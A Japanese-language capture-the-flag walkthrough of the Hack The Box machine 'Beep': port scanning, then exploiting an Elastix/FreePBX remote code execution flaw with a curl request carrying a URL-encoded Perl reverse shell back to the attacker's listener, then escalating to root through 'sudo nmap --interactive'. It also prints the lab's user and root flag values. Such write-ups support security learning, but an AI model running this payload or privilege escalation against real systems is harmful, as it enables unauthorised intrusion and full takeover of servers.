## STEP 1
```sh
└─$ rustscan -a 10.129.205.98 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where '404 Not Found' meets '200 OK'.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.205.98:22
Open 10.129.205.98:25
Open 10.129.205.98:80
Open 10.129.205.98:110
Open 10.129.205.98:111
Open 10.129.205.98:143
Open 10.129.205.98:443
Open 10.129.205.98:857
Open 10.129.205.98:993
Open 10.129.205.98:995
Open 10.129.205.98:3306
Open 10.129.205.98:4190
Open 10.129.205.98:4445
Open 10.129.205.98:4559
Open 10.129.205.98:5038
Open 10.129.205.98:10000
10.129.205.98 -> [22,25,80,110,111,143,443,857,993,995,3306,4190,4445,4559,5038,10000]
```
```sh
└─$ nmap -n -Pn -p 22,25,80,110,111,143,443,857,993,995,3306,4190,4445,4559,5038,10000 -sV 10.129.205.98
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 07:40 EDT
Nmap scan report for 10.129.205.98
Host is up (0.52s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp?
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
857/tcp   open  status     1 (RPC #100024)
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
4190/tcp  open  sieve?
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Host: 127.0.0.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.41 seconds
```


## STEP 2
8B番にアクセスすると、443番にリダイレクトされた  
がsslエラーが発生した  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Beep_01.png" width="75%" height="75%">  
どうやらtlsv1.0が有効らしい
```sh
└─$ sslscan 10.129.205.98                       
Version: 2.1.5
OpenSSL 3.5.0 8 Apr 2025

Connected to 10.129.205.98

Testing SSL server 10.129.205.98 on port 443 using SNI name 10.129.205.98

  SSL/TLS Protocols:
SSLv2     disabled
SSLv3     enabled
TLSv1.0   enabled
TLSv1.1   disabled
TLSv1.2   disabled
TLSv1.3   disabled

  TLS Fallback SCSV:
Server does not support TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression enabled (CRIME)

  Heartbleed:
TLSv1.0 not vulnerable to heartbleed

  Supported Server Cipher(s):
Preferred TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits
Accepted  TLSv1.0  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits
Accepted  TLSv1.0  256 bits  AES256-SHA                   
Accepted  TLSv1.0  128 bits  AES128-SHA                   
Accepted  TLSv1.0  128 bits  TLS_RSA_WITH_RC4_128_MD5     
Accepted  TLSv1.0  128 bits  TLS_RSA_WITH_RC4_128_SHA     
Accepted  TLSv1.0  56 bits   TLS_RSA_WITH_DES_CBC_SHA     
Accepted  TLSv1.0  112 bits  TLS_RSA_WITH_3DES_EDE_CBC_SHA
Accepted  TLSv1.0  56 bits   TLS_DHE_RSA_WITH_DES_CBC_SHA 
Accepted  TLSv1.0  112 bits  TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA

  SSL Certificate:
Signature Algorithm: sha1WithRSAEncryption
RSA Key Strength:    1024

Subject:  localhost.localdomain
Issuer:   localhost.localdomain

Not valid before: Apr  7 08:22:08 2017 GMT
Not valid after:  Apr  7 08:22:08 2018 GMT
```
firefoxの設定を修正  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Beep_02.png" width="50%" height="50%">  
無事確認できた  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Beep_03.png" width="50%" height="50%">  
elastixには、RCEの脆弱性がある
```sh
└─$ searchsploit -m 18650
  Exploit: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18650
     Path: /usr/share/exploitdb/exploits/php/webapps/18650.py
    Codes: OSVDB-80544, CVE-2012-4869
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (418)
Copied to: /home/kali/18650.py
```
PoCが実行エラーしたが、コードを確認するとurlのワンライナーでRCEできるっぽい  
修正する部分は、rhost、lhost、lport、extension  
extensionは、sipのextensinのこと、elastixはVoIP系のソフトウェアなのね
```
https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
```
sipのinviteで認証を求められるextensionを発見した
```sh
└─$ svwar -m INVITE 10.129.205.98 -e 233
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 233       | reqauth        |
+-----------+----------------+
```
PoCのrce実行
```sh
└─$ curl --insecure 'https://10.129.205.98/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.11%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <TITLE>Voicemail Message Call Me Control</TITLE>
    <link rel="stylesheet" href="../theme/main.css" type="text/css">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  </head>

<table class='voicemail' style='width: 100%; height: 100%; margin: 0 0 0 0; border: 0px; padding: 0px'><tr><td valign='middle' style='border: 0px'><a href='callme_page.php?action=h&callmenum=233@from-internal/n
Application: system
Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.16.11:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

'>Click here to hang up.</a></td></tr></table><script language='javascript'>parent.document.getElementById('callme_status').innerHTML = 'The call has been answered.';</script><script language='javascript'>parent.document.getElementById('pb_load_inprogress').value='false';</script><script language='javascript'>parent.document.getElementById('callme_status').parentNode.style.backgroundColor = 'white';</script>  </body>
</html>
```
リーバスシェル取得
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.205.98] 59677


id
id
uid=100(asterisk) gid=101(asterisk)


cat /home/fanis/user.txt
cat /home/fanis/user.txt
2d69147c6496412b22133b3a0bd01a6e
```
```sh
sudo -l
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
```
```sh
sudo nmap --interactive
sudo nmap --interactive


Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !bash
      !bash


id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)


cat /root/root.txt
cat /root/root.txt
458340087499999a4af363208718ed2c
```
